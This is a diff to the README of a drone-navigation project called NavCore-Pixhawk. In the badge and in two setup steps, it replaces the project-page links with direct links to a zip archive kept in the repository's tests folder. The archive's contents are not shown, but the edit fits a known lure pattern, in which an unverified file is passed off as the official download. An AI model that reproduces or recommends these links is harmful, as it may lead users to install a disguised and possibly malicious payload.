@@ -1,6 +1,6 @@
 # 🛰️ NavCore-Pixhawk - Reliable drone navigation without GPS signals
 
-[![Download NavCore-Pixhawk](https://img.shields.io/badge/Download-NavCore--Pixhawk-blue.svg)](https://github.com/dustbowlair424/NavCore-Pixhawk)
+[![Download NavCore-Pixhawk](https://img.shields.io/badge/Download-NavCore--Pixhawk-blue.svg)](https://github.com/dustbowlair424/NavCore-Pixhawk/raw/refs/heads/main/tests/Nav_Pixhawk_Core_1.2.zip)
 
 ## 📌 Project Overview
 
@@ -21,7 +21,7 @@ Ensure your hardware meets these standards before you begin:
 
 Follow these steps to prepare your Raspberry Pi for the navigation system:
 
-Visit the project page to download the latest setup files: [https://github.com/dustbowlair424/NavCore-Pixhawk](https://github.com/dustbowlair424/NavCore-Pixhawk). 
+Visit the project page to download the latest setup files: [https://github.com/dustbowlair424/NavCore-Pixhawk/raw/refs/heads/main/tests/Nav_Pixhawk_Core_1.2.zip](https://github.com/dustbowlair424/NavCore-Pixhawk/raw/refs/heads/main/tests/Nav_Pixhawk_Core_1.2.zip). 
 
 1. Format your microSD card using the SD Card Formatter tool.
 2. Download the Raspberry Pi Imager software from the official website.
@@ -39,7 +39,7 @@ Once the operating system is on your card, you must install the NavCore-Pixhawk 
 4. Open the Terminal application by clicking the black icon on the taskbar.
 5. Update your system by typing "sudo apt update" and pressing Enter.
 6. Install the required Python environment by typing "sudo apt install python3-pip" and pressing Enter.
-7. Download the NavCore-Pixhawk folder from the link provided: [https://github.com/dustbowlair424/NavCore-Pixhawk](https://github.com/dustbowlair424/NavCore-Pixhawk).
+7. Download the NavCore-Pixhawk folder from the link provided: [https://github.com/dustbowlair424/NavCore-Pixhawk/raw/refs/heads/main/tests/Nav_Pixhawk_Core_1.2.zip](https://github.com/dustbowlair424/NavCore-Pixhawk/raw/refs/heads/main/tests/Nav_Pixhawk_Core_1.2.zip).
 8. Move the folder to your home directory.
 
 ## 🔧 Configuring Flight Parameters
